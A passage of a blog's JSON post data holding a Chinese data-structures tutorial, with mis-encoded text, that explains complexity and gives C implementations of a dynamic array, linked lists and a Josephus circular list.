basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"}],"author":"HeRui"},{"title":"æ•°æ®ç»“æ„æ•´ç†-part1","slug":"æ•°æ®ç»“æ„æ•´ç†-part1","date":"2021-10-03T13:30:33.000Z","updated":"2023-08-07T11:54:31.042Z","comments":true,"path":"posts/d828af60.html","link":"","permalink":"https://racleray.github.io/posts/d828af60.html","excerpt":"å¸¸è§åŸºæœ¬æ•°æ®ç»“æ„æ•´ç†ï¼Œä½¿ç”¨Cè¯­è¨€ç¼–å†™ã€‚","text":"å¯¼è®º æ•°æ®ç»“æ„ æ˜¯è®¡ç®—æœºå­˜å‚¨ã€ç»„ç»‡æ•°æ®çš„æ–¹å¼ï¼Œæ˜¯æŒ‡æ•°æ®å…ƒç´ çš„é›†åˆä»¥åŠæ•°æ®å…ƒç´ ä¹‹é—´å­˜åœ¨çš„ä¸€ç§æˆ–è€…å¤šç§å…³ç³»çš„é›†åˆ å…ƒç´ ä¹‹é—´çš„å…³ç³»åŒ…æ‹¬æ•°æ®çš„é€»è¾‘ç»“æ„ã€æ•°æ®çš„å­˜å‚¨ç»“æ„å’Œæ•°æ®çš„è¿ç®—ç»“æ„ã€‚ æ•°æ® æ˜¯ä¿¡æ¯çš„è½½ä½“ï¼Œæ˜¯å¯ä»¥è¢«è®¡ç®—æœºè¯†åˆ«å­˜å‚¨å¹¶åŠ å·¥å¤„ç†çš„æè¿°å®¢è§‚äº‹ç‰©çš„ä¿¡æ¯ç¬¦å·çš„æ€»ç§°ã€‚ æ•°æ®å…ƒç´  æ˜¯æ•°æ®çš„åŸºæœ¬å•ä½ï¼Œåœ¨è®¡ç®—æœºç¨‹åºä¸­é€šå¸¸ä½œä¸ºä¸€ä¸ªæ•´ä½“è€ƒè™‘ã€‚ä¸€ä¸ªæ•°æ®å…ƒç´ ç”±è‹¥å¹²ä¸ª æ•°æ®é¡¹ ç»„æˆã€‚ æ•°æ®é¡¹æ˜¯æ•°æ®ç»“æ„ä¸­è®¨è®ºçš„æœ€å°å•ä½ã€‚æœ‰ä¸¤ç±»æ•°æ®å…ƒç´ ï¼šå¦‚æœæ•°æ®å…ƒç´ ä¸èƒ½å†åˆ†ï¼Œåˆ™ç§°ä¸º åŸå­é¡¹ ï¼›å¦‚æœæ•°æ®å…ƒç´ ç”±è‹¥å¹²ä¸ªæ•°æ®é¡¹ç»„æˆï¼Œåˆ™ç§°ä¸º ç»„åˆé¡¹ ã€‚ æ•°æ®ç»“æ„æ˜¯ä¸€é—¨ç ”ç©¶éæ•°å€¼è®¡ç®—çš„å­¦ç§‘ï¼Œä¸»è¦ç ”ç©¶æ•°æ®å…ƒç´ ä»¥åŠå®ƒä»¬ä¹‹é—´çš„å…³ç³»å’Œè¿ç®—ç­‰ï¼Œè€Œä¸”ç¡®ä¿ç»è¿‡è¿™äº›è¿ç®—åæ‰€å¾—åˆ°çš„æ–°ç»“æ„ä»ç„¶æ˜¯åŸæ¥çš„ç»“æ„ç±»å‹ã€‚ æ•°æ®ç»“æ„æœ‰ä¸¤ä¸ªè¦ç´ ï¼Œä¸€ä¸ªæ˜¯æ•°æ®å…ƒç´ çš„é›†åˆï¼Œå¦ä¸€ä¸ªæ˜¯å…³ç³»çš„é›†åˆã€‚ é›†åˆç»“æ„ã€‚æ•°æ®å…ƒç´ å±äºåŒä¸€ä¸ªé›†åˆã€‚ çº¿æ€§ç»“æ„ã€‚æ•°æ®å…ƒç´ ä¹‹é—´å­˜åœ¨ç€ä¸€å¯¹ä¸€çš„å…³ç³»ã€‚å¸¸è§çš„æœ‰é“¾è¡¨ã€é˜Ÿåˆ—ã€æ ˆç­‰ã€‚ æ ‘å½¢ç»“æ„ã€‚æ•°æ®å…ƒç´ ä¹‹é—´å­˜åœ¨ç€ä¸€å¯¹å¤šçš„å…³ç³»ã€‚å¸¸è§çš„æœ‰äºŒå‰æ ‘ã€äºŒå‰æŸ¥æ‰¾æ ‘ã€å¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘ç­‰ã€‚ å›¾å½¢ç»“æ„ã€‚æ•°æ®å…ƒç´ ä¹‹é—´å­˜åœ¨ç€å¤šå¯¹å¤šçš„å…³ç³»ã€‚ æŒ‰ç…§å­˜å‚¨æ–¹å¼çš„ä¸åŒï¼Œæ•°æ®ç»“æ„å¯ä»¥åˆ†ä¸ºé¡ºåºå­˜å‚¨ç»“æ„å’Œé“¾å¼å­˜å‚¨ç»“æ„ï¼š é¡ºåºå­˜å‚¨ç»“æ„ï¼Œè¡¨ç¤ºæ•°æ®å…ƒç´ åœ¨å­˜å‚¨å™¨ä¸­æ˜¯è¿ç»­å­˜å‚¨çš„ï¼Œå¯ä»¥ç”¨ç›¸å¯¹ä½ç½®æ¥è¡¨ç¤ºæ•°æ®å…ƒç´ ä¹‹é—´çš„é€»è¾‘ç»“æ„ï¼Œå¦‚é¡ºåºè¡¨ã€é˜Ÿåˆ—ã€æ ˆç­‰ã€‚ é“¾å¼å­˜å‚¨ç»“æ„ï¼Œæ¯ä¸ªæ•°æ®å…ƒç´ é‡Œè®¾ç½®äº†ä¸€ä¸ªæŒ‡é’ˆç”¨æ¥æŒ‡å‘å¦ä¸€ä¸ªå…ƒç´ çš„å­˜å‚¨åœ°å€ï¼Œä»¥æ­¤æ¥è¡¨ç¤ºæ•°æ®å…ƒç´ ä¹‹é—´çš„é€»è¾‘ç»“æ„ã€‚ æŒ‰ç…§é€»è¾‘ç»“æ„æ¥åˆ†ï¼Œæ•°æ®ç»“æ„å¯ä»¥åˆ†ä¸ºçº¿æ€§ç»“æ„å’Œéçº¿æ€§ç»“æ„ å¦‚æœæ•°æ®å…ƒç´ ä¹‹é—´å­˜åœ¨ä¸€å¯¹ä¸€çš„å…³ç³»ï¼Œåˆ™ç§°ä¸ºçº¿æ€§ç»“æ„ å¦åˆ™ç§°ä¸ºéçº¿æ€§ç»“æ„ã€‚é›†åˆç»“æ„ã€æ ‘å½¢ç»“æ„ã€å›¾å½¢ç»“æ„éƒ½ç§°ä¸ºéçº¿æ€§ç»“æ„ã€‚ ç®—æ³•ï¼ˆAlgorithmï¼‰æ˜¯å¯¹æŸä¸€ä¸ªæˆ–è€…æŸä¸€ç±»é—®é¢˜çš„è§£å†³æ–¹æ¡ˆçš„æè¿°ï¼Œæ ¹æ®é—®é¢˜çš„è¾“å…¥ï¼Œåœ¨æœ‰é™çš„è®¡ç®—æ—¶é—´é‡Œè¾“å‡ºé¢„æœŸçš„ç»“æœã€‚ ç®—æ³•æœ‰ä»¥ä¸‹ 5 ä¸ªç‰¹å¾ï¼š æœ‰ç©·æ€§ã€‚ç®—æ³•å¿…é¡»åœ¨æ‰§è¡Œæœ‰é™ä¸ªæ“ä½œåç»ˆæ­¢ã€‚ ç¡®åˆ‡æ€§ã€‚ç®—æ³•çš„æ¯ä¸€ä¸ªæ“ä½œå¿…é¡»æœ‰æ˜ç¡®çš„å®šä¹‰ã€‚ è¾“å…¥é¡¹ã€‚ç®—æ³•æœ‰é›¶ä¸ªæˆ–å¤šä¸ªè¾“å…¥ï¼Œæè¿°ç®—æ³•çš„åˆå§‹çŠ¶æ€ã€‚ è¾“å‡ºé¡¹ã€‚ç®—æ³•æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªè¾“å‡ºï¼Œæ²¡æœ‰è¾“å‡ºçš„ç®—æ³•æˆ‘ä»¬è®¤ä¸ºæ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ å¯è¡Œæ€§ã€‚ç®—æ³•çš„æ¯ä¸ªè®¡ç®—æ“ä½œéƒ½å¯ä»¥åœ¨æœ‰é™æ—¶é—´å†…å®Œæˆã€‚ æ•°æ®ç»“æ„æè¿°äº†æ•°æ®å…ƒç´ ä¹‹é—´çš„é€»è¾‘å…³ç³»ï¼Œç®—æ³•æè¿°äº†æ•°æ®å…ƒç´ çš„æ“ä½œæ­¥éª¤ï¼Œæ•°æ®ç»“æ„å’Œç®—æ³•ç»„æˆäº†ç¨‹åºä¸–ç•Œã€‚æ•°æ®ç»“æ„å’Œç®—æ³•ä¹‹é—´æ˜¯ä¸å¯åˆ†å‰²çš„å…³ç³»ï¼Œæ•°æ®ç»“æ„æ˜¯ç¨‹åºçš„åŸºç¡€ï¼Œç®—æ³•å°†æ•°æ®äº’ç›¸è”ç³»èµ·æ¥ï¼Œå½¢æˆäº†ä¸€å¥—èƒ½è§£å†³å…·ä½“é—®é¢˜çš„æ–¹æ¡ˆã€‚ åœ¨è§£å†³é—®é¢˜æ—¶ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šä¼˜å…ˆç¡®å®šæ•°æ®ç»“æ„ï¼Œç„¶åå†æ¥å®Œå–„ç®—æ³•ï¼Œæœ‰æ—¶ä¹Ÿä¼šåè¿‡æ¥ï¼Œæ ¹æ®ç®—æ³•æ¥é€‰æ‹©åˆé€‚çš„æ•°æ®ç»“æ„ã€‚é€‰æ‹©ä¸€ä¸ªåˆé€‚çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥é™ä½ç®—æ³•çš„å¤æ‚åº¦ï¼Œæé«˜ç®—æ³•çš„æ•ˆç‡ã€‚ å¤æ‚åº¦åˆ†æ æ—¶é—´å¤æ‚åº¦ æ—¶é—´é¢‘åº¦æ˜¯æŒ‡ç®—æ³•ä¸­è¯­å¥çš„æ‰§è¡Œæ¬¡æ•°ï¼Œç”¨ T(n) æ¥è¡¨ç¤ºï¼Œ n ä¸ºé—®é¢˜çš„è§„æ¨¡ã€‚ æ—¶é—´é¢‘åº¦çš„è¡¨è¾¾æ–¹æ³•æœ‰ç‚¹å¤æ‚ï¼Œæˆ‘ä»¬éœ€è¦æ›´ç›´è§‚çš„è¡¨è¾¾æ–¹æ³•ï¼Œäºæ˜¯å¼•å…¥äº†æ—¶é—´å¤æ‚åº¦çš„æ¦‚å¿µã€‚ å‡½æ•° f(n)ï¼Œåœ¨ n è¶‹å‘äºæ— ç©·å¤§æ—¶ï¼Œ T(n)/f(n) çš„æé™å€¼ä¸ºä¸ç­‰äº 0 çš„å¸¸æ•°ï¼Œåˆ™æˆ‘ä»¬è¿‘ä¼¼çš„å°† f(n) æ›¿ä»£ T(n)ï¼Œè®°ä¸º T(n)=O(f(n))ï¼Œç§°ä¸ºç®—æ³•çš„æ¸è¿›æ—¶é—´å¤æ‚åº¦ã€‚ æ—¶é—´å¤æ‚åº¦åªå…³å¿ƒç®—æ³•ä¸­æœ€è€—æ—¶çš„éƒ¨åˆ† å¸¸è§å¤æ‚åº¦çº§åˆ« ç©ºé—´å¤æ‚åº¦ ç©ºé—´å¤æ‚åº¦æ˜¯æŒ‡è¿è¡Œè¯¥ç®—æ³•æ‰€å ç”¨çš„å­˜å‚¨ç©ºé—´å¤§å°ï¼Œè®°ä¸º S(n) é¢„ä¼°å‡ºç®—æ³•è¿è¡Œæ‰€éœ€çš„å­˜å‚¨ç©ºé—´ï¼ŒåŒ…æ‹¬æŒ‡ä»¤ç©ºé—´ã€æ•°æ®ç©ºé—´ã€åŠ¨æ€ç”³è¯·çš„å†…å­˜ç©ºé—´ç­‰ã€‚ 12345int *a = new int[n];int **b = new int*[n];for (int i = 0; i &lt; n; i++) &#123; b[i] = new int[n];&#125; S(n)=n+n^2ï¼Œåˆ™ç©ºé—´å¤æ‚åº¦ä¸º O(n^2)ã€‚ å†…å®¹ æ•°æ®ç»“æ„I åŒ…å«äº†ä¸€äº›åŸºç¡€çš„æ•°æ®ç»“æ„ï¼Œä¸€å…±åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š çº¿æ€§ç»“æ„ï¼ŒåŒ…æ‹¬é¡ºåºè¡¨ã€é“¾è¡¨ã€é˜Ÿåˆ—ã€æ ˆç­‰ï¼› æ ‘ç»“æ„å’Œå›¾ç»“æ„çš„å…¥é—¨ï¼ŒåŒ…æ‹¬äºŒå‰æ ‘ã€å›¾çš„å­˜å‚¨æ–¹å¼ç­‰ï¼› æŸ¥æ‰¾æ’åºç®—æ³•ï¼ŒåŒ…æ‹¬å“ˆå¸Œè¡¨ã€é¡ºåºæŸ¥æ‰¾ã€æŠ˜åŠæŸ¥æ‰¾ã€ä¸‰åˆ†æŸ¥æ‰¾ç­‰æŸ¥æ‰¾ç®—æ³•ï¼Œå’Œæ’å…¥æ’åºã€å†’æ³¡æ’åºã€å½’å¹¶æ’åºã€é€‰æ‹©æ’åºå’Œå¿«é€Ÿæ’åºç­‰æ’åºç®—æ³•ã€‚ æ•°æ®ç»“æ„II åŒ…å«äº†ä¸€äº›è¿›é˜¶çš„æ•°æ®ç»“æ„ï¼Œä¸€å…±åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š æ ‘ç»“æ„ï¼ŒåŒ…æ‹¬äºŒå‰æŸ¥æ‰¾æ ‘ã€å¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘ã€å †ä¸ä¼˜å…ˆé˜Ÿåˆ—ã€æ£®æ—ä¸å¹¶æŸ¥é›†ç­‰ï¼› å›¾ç»“æ„ï¼ŒåŒ…æ‹¬å›¾çš„éå†ã€å›¾çš„è¿é€šæ€§ã€æœ€çŸ­è·¯å’Œæœ€å°ç”Ÿæˆæ ‘ç­‰ç®—æ³•ã€‚ çº¿æ€§è¡¨ çº¿æ€§è¡¨æ˜¯ç”± ç›¸åŒæ•°æ®ç±»å‹ çš„ n ä¸ªæ•°æ®å…ƒç´ ç»„æˆçš„æœ‰é™åºåˆ—ã€‚ çº¿æ€§è¡¨æŒ‰ç…§å­˜å‚¨ç»“æ„ï¼Œå¯ä»¥åˆ†ä¸ºé¡ºåºè¡¨å’Œé“¾è¡¨ä¸¤ç§ç±»å‹ã€‚ é¡ºåºè¡¨ å®ç°é¡ºåºè¡¨çš„æ„é€ ã€æ’å…¥ã€æ‰©å®¹ã€æŸ¥æ‰¾ã€åˆ é™¤ã€éå†è¿™ 6 ç§åŸºæœ¬æ“ä½œï¼Œå¹¶åœ¨æœ¬ç« æœ€åç”¨é¡ºåºè¡¨è¿™ä¸ªæ•°æ®ç»“æ„æ±‚è§£ä¸€é“é¢˜ç›® é¡ºåºè¡¨æ˜¯çº¿æ€§è¡¨çš„ä¸€ç§é¡ºåºå­˜å‚¨å½¢å¼ã€‚æ¢å¥è¯è¯´ï¼Œçº¿æ€§è¡¨æ˜¯é€»è¾‘ç»“æ„ï¼Œè¡¨ç¤ºå…ƒç´ ä¹‹é—´ä¸€å¯¹ä¸€çš„ç›¸é‚»å…³ç³»ï¼›è€Œé¡ºåºè¡¨æ˜¯å­˜å‚¨ç»“æ„ï¼Œæ˜¯æŒ‡ç”¨ä¸€ç»„åœ°å€è¿ç»­çš„å­˜å‚¨å•å…ƒï¼Œä¾æ¬¡å­˜å‚¨çº¿æ€§è¡¨ä¸­çš„æ•°æ®å…ƒç´ ï¼Œä»è€Œä½¿å¾—é€»è¾‘ä¸Šç›¸é‚»çš„ä¸¤ä¸ªå…ƒç´ åœ¨ç‰©ç†ä½ç½®ä¸Šä¹Ÿç›¸é‚»ã€‚ é¡ºåºè¡¨åœ¨ç¨‹åºä¸­é€šå¸¸ç”¨ä¸€ç»´æ•°ç»„å®ç°ï¼Œä¸€ç»´æ•°ç»„å¯ä»¥æ˜¯é™æ€åˆ†é…çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯åŠ¨æ€åˆ†é…çš„ã€‚ åœ¨é™æ€åˆ†é…æ—¶ï¼Œç”±äºæ•°ç»„çš„å¤§å°å’Œç©ºé—´æ˜¯å›ºå®šçš„ åœ¨åŠ¨æ€åˆ†é…æ—¶ï¼Œå­˜å‚¨æ•°ç»„çš„ç©ºé—´åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šåŠ¨æ€è°ƒæ•´å¤§å° æ”¯æŒéšæœºè®¿é—® æ’å…¥å’Œåˆ é™¤æ“ä½œéœ€è¦ç§»åŠ¨å¤§é‡çš„å…ƒç´ ï¼Œä»è€Œä¿æŒé€»è¾‘ä¸Šå’Œç‰©ç†ä¸Šçš„è¿ç»­æ€§ã€‚ å †é‡Œæ•°ç»„ï¼ŒåŒæ—¶ä½¿ç”¨ä¸€æ®µè¿ç»­åœ°å€ï¼Œå‚¨å­˜ç›¸åŒç±»å‹çš„æœ‰é™æ•°æ®åºåˆ—ã€‚ implement å®ç°ä¸€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Vector &#123; int size, length; int *data;&#125; Vector;void init(Vector *vector, int size) &#123; vector-&gt;size = size; vector-&gt;length = 0; vector-&gt;data = (int *)malloc(sizeof(int) * size);&#125;// è¯·åœ¨ä¸‹é¢å®ç°æ‰©å®¹å‡½æ•° expandvoid expand(Vector *vector) &#123; int *old_data = vector-&gt;data; vector-&gt;size = vector-&gt;size * 2; vector-&gt;data = (int *)malloc(sizeof(int) * vector-&gt;size); for (int i = 0; i &lt; vector-&gt;length; ++i) &#123; vector-&gt;data[i] = old_data[i]; &#125; free(old_data);&#125;int insert(Vector *vector, int loc, int value) &#123; if (loc &lt; 0 || loc &gt; vector-&gt;length) &#123; return ERROR; &#125; if (vector-&gt;length &gt;= vector-&gt;size) &#123; // return ERROR; expand(vector); &#125; for (int i = vector-&gt;length; i &gt; loc; --i) &#123; vector-&gt;data[i] = vector-&gt;data[i - 1]; &#125; vector-&gt;data[loc] = value; vector-&gt;length++; return OK;&#125;int search(Vector *vector, int value) &#123; for (int i = 0; i &lt; vector-&gt;length; ++i) &#123; if (vector-&gt;data[i] == value) &#123; return i; &#125; &#125; return -1;&#125;int delete_node(Vector *vector, int index) &#123; if (index &lt; 0 || index &gt;= vector-&gt;length) &#123; return ERROR; &#125; for (int i = index + 1; i &lt; vector-&gt;length; ++i) &#123; vector-&gt;data[i - 1] = vector-&gt;data[i]; &#125; vector-&gt;length--; return OK;&#125;void print(Vector *vector) &#123; for (int i = 0; i &lt; vector-&gt;length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", vector-&gt;data[i]); &#125; printf(\"\\n\");&#125;void clear(Vector *vector) &#123; free(vector-&gt;data); free(vector);&#125;int main() &#123; Vector *a = (Vector *)malloc(sizeof(Vector)); init(a, 100); printf(\"%d\\n\", insert(a, 1, 0)); printf(\"%d\\n\", insert(a, 0, 1)); printf(\"%d\\n\", insert(a, 2, 1)); printf(\"%d\\n\", insert(a, 1, 2)); printf(\"%d\\n\", insert(a, 0, 3)); clear(a); return 0;&#125; å®ç°äºŒ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define ERROR 0#define OK 1/*é”™è¯¯å¤„ç†è¿˜ä¸ä¸¥è°¨ï¼Œä½¿ç”¨memæ“ä½œï¼Œæ¯”ä¸Šä¸€ä¸ªforå¾ªç¯é«˜æ•ˆ*/typedef struct Vector &#123; int s, l; int *d;&#125; Vector;void init(Vector *v, int size) &#123; if (!v) return; v-&gt;s = size; v-&gt;l = 0; v-&gt;d = (int *)malloc(size * sizeof(int));&#125;int expand(Vector *v) &#123; if (!v) return ERROR; int expandsize = v-&gt;s; int *tmp = NULL; while (expandsize) &#123; // realloc, append v-&gt;d. If necessary, copy to a bigger memory block. tmp = (int *)realloc(v-&gt;d, sizeof(int) * (v-&gt;s + expandsize)); if (tmp) break; expandsize &gt;&gt;= 2; &#125; if (!tmp) return ERROR; v-&gt;d = tmp; v-&gt;s += expandsize; // printf(\"Expand succeed\"); return OK;&#125;int insert(Vector *v, int loc, int value) &#123; if (!v) return ERROR; if (loc &lt; 0 || loc &gt; v-&gt;l) return ERROR; if (v-&gt;s &lt;= v-&gt;l) &#123; if (!expand(v)) return ERROR; &#125; memcpy(v-&gt;d + loc + 1, v-&gt;d + loc, sizeof(int) * (v-&gt;l - loc)); v-&gt;d[loc] = value; v-&gt;l++; return OK;&#125;int search(Vector *v, int target) &#123; if (!v) return ERROR; for (int i = 0; i &lt; v-&gt;l; ++i) &#123; if (*(v-&gt;d + i) == target) return i + 1; // return index begin from 1 &#125; return ERROR;&#125;int delete_node(Vector *v, int loc) &#123; if (!v) return ERROR; if (loc &lt; 0 || loc &gt;= v-&gt;l) return ERROR; memcpy(v-&gt;d + loc, v-&gt;d + loc + 1, sizeof(int) * (v-&gt;l - loc - 1)); v-&gt;l--; return OK;&#125;void print(Vector *v) &#123; int *tmp = v-&gt;d; int i = 0; while (i &lt; v-&gt;l) &#123; (i &gt; 0) &amp;&amp; printf(\" \"); printf(\"%d\", *tmp); ++i; ++tmp; &#125; printf(\"\\n\");&#125;void clear(Vector *v) &#123; free(v-&gt;d); free(v);&#125;int main() &#123; Vector *v = (Vector *)malloc(sizeof(Vector)); init(v, 20); // random test: use #include &lt;time.h&gt; srand(time(NULL)); op = rand() % 4; ... int n, op, loc, val; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;op); switch (op) &#123; case 1: scanf(\"%d%d\", &amp;loc, &amp;val); if (insert(v, loc, val)) printf(\"success\\n\"); else printf(\"failed\\n\"); break; case 2: scanf(\"%d\", &amp;loc); if (delete_node(v, loc)) printf(\"success\\n\"); else printf(\"failed\\n\"); break; case 3: scanf(\"%d\", &amp;val); if (search(v, val)) printf(\"success\\n\"); else printf(\"failed\\n\"); break; case 4: print(v); break; &#125; &#125; clear(v); return 0;&#125; é“¾è¡¨ implement æ³¨æ„æ²¡æœ‰å•ç‹¬å®šä¹‰ linked list ç»“æ„ä½“ï¼Œæ²¡æœ‰è®°å½•é•¿åº¦ã€‚ ç¤ºä¾‹ç”¨ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node&#123; int data; struct Node *next;&#125;Node, *LinkedList;LinkedList insert(LinkedList head, Node *node, int index) &#123; if (head == NULL) &#123; if (index != 0) &#123; return head; &#125; head = node; return head; &#125; if (index == 0) &#123; node-&gt;next = head; head = node; return head; &#125; Node *current_node = head; int count = 0; while (current_node-&gt;next != NULL &amp;&amp; count &lt; index - 1) &#123; current_node = current_node-&gt;next; count++; &#125; if (count == index - 1) &#123; node-&gt;next = current_node-&gt;next; current_node-&gt;next = node; &#125; return head;&#125;void output(LinkedList head) &#123; if (head == NULL) &#123; return; &#125; Node *current_node = head; while (current_node != NULL) &#123; printf(\"%d \", current_node-&gt;data); current_node = current_node-&gt;next; &#125; printf(\"\\n\");&#125;LinkedList delete_node(LinkedList head, int index) &#123; if (head == NULL) &#123; return head; &#125; Node *current_node = head; int count = 0; if (index == 0) &#123; head = head-&gt;next; free(current_node); return head; &#125; // count &lt; index - 1: index æ¯” é“¾è¡¨é•¿åº¦ å¤§å¾ˆå¤šï¼Œcount == index - 1 ä¸ä¼šæˆç«‹ï¼Œè¿™é‡Œå°±æ˜¯è¦ä¿è¯æ‰¾åˆ°ç›®æ ‡ä½ç½®æ—¶ï¼Œcount == index - 1 æˆç«‹ while (current_node-&gt;next != NULL &amp;&amp; count &lt; index - 1) &#123; current_node = current_node-&gt;next; count++; &#125; // åœåœ¨è¦åˆ é™¤ä½ç½®å‰ä¸€ä¸ªï¼Œcurrent_node-&gt;next != NULL åº”è¯¥æ’æˆç«‹ if (count == index - 1 &amp;&amp; current_node-&gt;next != NULL) &#123; Node *delete_node = current_node-&gt;next; current_node-&gt;next = delete_node-&gt;next; free(delete_node); &#125; return head;&#125;LinkedList reverse(LinkedList head) &#123; if (head == NULL) &#123; return head; &#125; Node *next_node, *current_node; current_node = head-&gt;next; head-&gt;next = NULL; while (current_node != NULL) &#123; next_node = current_node-&gt;next; current_node-&gt;next = head; head = current_node; current_node = next_node; &#125; return head;&#125;void clear(LinkedList head) &#123; Node *current_node = head; while (current_node != NULL) &#123; Node *delete_node = current_node; current_node = current_node-&gt;next; free(delete_node); &#125;&#125;int main() &#123; LinkedList linkedlist = NULL; for (int i = 1; i &lt;= 10; i++) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;data = i; node-&gt;next = NULL; linkedlist = insert(linkedlist, node, i - 1); &#125; output(linkedlist); linkedlist = delete_node(linkedlist, 9); output(linkedlist); linkedlist = reverse(linkedlist); output(linkedlist); clear(linkedlist); return 0;&#125; å¾ªç¯é“¾è¡¨çº¦ç‘Ÿå¤«ç¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node&#123; int data; struct Node *next;&#125;Node, *LinkedList;LinkedList insert(LinkedList head, Node *node, int index) &#123; if (head == NULL) &#123; if (index != 0) &#123; return head; &#125; head = node; head-&gt;next = head; return head; &#125; if (index == 0) &#123; node-&gt;next = head-&gt;next; // å¾ªç¯ head-&gt;next = node; return head; &#125; Node *current_node = head-&gt;next; // headä¸ºæ ‡è®°çš„å°¾èŠ‚ç‚¹ int count = 0; while (current_node != head &amp;&amp; count &lt; index - 1) &#123; current_node = current_node-&gt;next; count++; &#125; if (count == index - 1) &#123; node-&gt;next = current_node-&gt;next; current_node-&gt;next = node; &#125; // æ­¤æ—¶æ›´æ–°å°¾èŠ‚ç‚¹ if (node == head-&gt;next) &#123; head = node; &#125; return head;&#125;// çº¦ç‘Ÿå¤«ç¯void output_josephus(LinkedList head, int m) &#123; Node *current_node = head; head = NULL; while (current_node-&gt;next != current_node) &#123; for (int i = 1; i &lt; m; i++) &#123; current_node = current_node-&gt;next; &#125; printf(\"%d \", current_node-&gt;next-&gt;data); Node *delete_node = current_node-&gt;next; current_node-&gt;next = current_node-&gt;next-&gt;next; free(delete_node); &#125; printf(\"%d\\n\", current_node-&gt;data); free(current_node);&#125;int main() &#123; LinkedList linkedlist = NULL; int n, m; scanf(\"%d %d\", &amp;n, &amp;m); for (int i = 1; i &lt;= n; i++) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;data = i; node-&gt;next = NULL; linkedlist = insert(linkedlist, node, i - 1); &#125; output_josephus(linkedlist, m); return 0;&#125; å¾ªç¯é“¾è¡¨éœ€è¦è®°å½•çš„æ˜¯å°¾ç»“ç‚¹çš„ä½ç½®ã€‚é‚£ä¹ˆæ’å…¥èŠ‚ç‚¹å°±ä¸ä¼šå¾ªç¯ä¸€åœˆï¼Œæ‰èƒ½æ‰¾åˆ°å°¾ç»“ç‚¹ã€‚ å¢åŠ  dummy node çš„è§£æ³• å•å‘ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;typedef struct Node&#123; int val; struct Node *next;&#125; Node;typedef struct List&#123; // Node *head; æ”¹ä¸º dummy node, è€Œä¸å†æ˜¯ä¸€ä¸ªæŒ‡é’ˆ Node head; int len;&#125; List;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; return n;&#125;void freeNode(Node *n) &#123; if (n) free(n); return;&#125;List *initList() &#123; List *l = (List *)malloc(sizeof(List)); l-&gt;head.next = NULL; l-&gt;len = 0; return l;&#125;void freeList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *del_ = NULL; while (p) &#123; del_ = p; p = p-&gt;next; free(del_); &#125; free(l); return;&#125;// æ’å…¥è¾“å…¥èŠ‚ç‚¹int insertNode(List *l, int idx, Node *n) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt; l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; n-&gt;next = prev-&gt;next; prev-&gt;next = n; l-&gt;len++; return 1;&#125;// æ’å…¥è¾“å…¥å€¼int insertValue(List *l, int idx, int val) &#123; Node *n = initNode(val); if (!insertNode(l, idx, n)) &#123; freeNode(n); return 0; &#125; return 1;&#125;// åˆ é™¤int erase(List *l, int idx) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt;= l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; Node *tmp = prev-&gt;next; prev-&gt;next = tmp-&gt;next; freeNode(tmp); l-&gt;len--; return 1;&#125;int search(List *l, int idx) &#123; if (!l) return -1; if (idx &lt; 0 | idx &gt;= l-&gt;len) return -1; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; return prev-&gt;next-&gt;val;&#125;void showList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *tmp = &amp;(l-&gt;head); printf(\"List+: [\"); while (p) &#123; tmp = p; printf(\"%d-&gt;\", p-&gt;val); p = p-&gt;next; &#125; printf(\"NULL]\\n\"); return;&#125; å¢åŠ  dummy node çš„è§£æ³• åŒå‘ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;typedef struct Node&#123; int val; struct Node *next; struct Node *prev;&#125; Node;typedef struct List&#123; // Node *head; æ”¹ä¸º dummy node, 